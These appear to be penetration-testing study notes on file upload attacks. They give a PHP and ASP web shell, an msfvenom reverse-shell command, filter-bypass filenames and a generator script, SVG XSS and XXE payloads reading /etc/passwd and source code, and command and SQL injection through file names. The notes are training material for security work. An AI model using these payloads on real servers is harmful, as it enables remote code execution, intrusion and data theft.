# Types of attacks
## File metadata attacks
Path and filename can trick an application into writing a file to an unexpected location
## File contents attack 
Attacker may be able to upload unexpected content
## File size attack
Attacker may upload a large file to perform a Denial-Of-Service attack,

# Arbitrary File Upload 
* Need to determine what language is being used on the server-side
	* Visit `/index.<extension>` try various extensions such as `php`, `asp` `aspx`
	* Use [Wappalyser](https://www.wappalyzer.com/)

### Common WebShells
* [PHPbash](https://github.com/Arrexel/phpbash)
* `/usr/share/SecLists/Web-Shells`
* Easy webshell:
```php
<?php system($_REQUEST['cmd']); ?>
```
in the URL:
`?cmd=id`

* .NET applications
```asp
<% eval request('cmd') %>
```
Custom Reverse Shells 
```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

## Client Side Validation 
### Burp
* Use Burp to look at a normal request message 
* Modify file names and content type if needed.
### Disabling Front-end validation
* Look in browsers page inspector `Ctrl+Shift+C`
* Highlight the file input line
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
Look for the onchange fuction
```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```
Remove the function from the html
`onchange=""` and remove the accept tag to
* Once uploaded use page inspector to load the source of the image
## Blacklist Filters
1. Testing against a blacklist of types 
2. testing against a whitelist of types

### Fuzzing Extensions
PayloadAllTheThings has lists of extensions for PHP and .NET
SECLists Common WebExtensions

Fuzz on Burp
## Whitelist Filters
* Try double extensions
	* `filename.jpg.php`
* Reverse double extensions 
	* `filename.php.jpg`
* Character Injection 
	* - `%20`
	- `%0a`
	- `%00`
	- `%0d0a`
	- `/`
	- `.\`
	- `.`
	- `…`
	- `:`
		- `shell.php%00.jpg`
- Bash script to generate all examples:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
## Type Filters
* Validating the `Content-Type` header and `File Content`
* You can fuzz [content type headers](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
### MIME-Type
* Multipurpose Internet Mail Extensions
* Determines file type through its general format and bytes structure
* Looking at a files [magic bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
* PHP uses the `mime_content_type()`
* Add the mime at the start of the file 
```php
GIF8
<?php ?>
```

## Limited File Uploads
Certain file types such as `SVG, HTML, XML` may allow us to introduce new vulnerabilities to a web page

### XSS
May be able to introduce a stored XSS vulnerability.
Can upload a HTML file with JavaScript
XSS can be carried with SVG images along with several other attacks:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
### XXE
Leak file information 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Use XXE to read source code in PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
### DoS
* Decompression Bomb
	* Nested archives that contain petabytes of data that when unzipped crash the server
* Pixel Flood
	* Make a JPG image with any file size and then modify the compression data to have a size of 0xffff x 0xffff which is 4 giga pixels.
## Other attacks
### injections in file name
* Name a file `file$(whoami).jpg` or ```file`whoami`.jpg``` or `file.jpg||whoami` this would make the file name then execute `whoami` and as such be a RCE
* Can also use a XSS payload. Filename: `<script>alert(window.origin);</script>`
* Can inject SQL query in a file name. Filename: `file';select+sleep(5); --.jpg`

### Upload Directory Disclosure
* Utilise fuzzing to find where the files are located
* Force error messages:
	* Upload a filename that already exists
		* may disclose file path

### Windows specific:
* Use reserved characters `|, < , >, * , ?` If the web application does not sanitise these they may cause errors or disclose more information.
* Use reserved names `CON, COM, LPT1, NUL`
* [Overwrite existing files](https://en.wikipedia.org/wiki/8.3_filename)
* For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.
* 
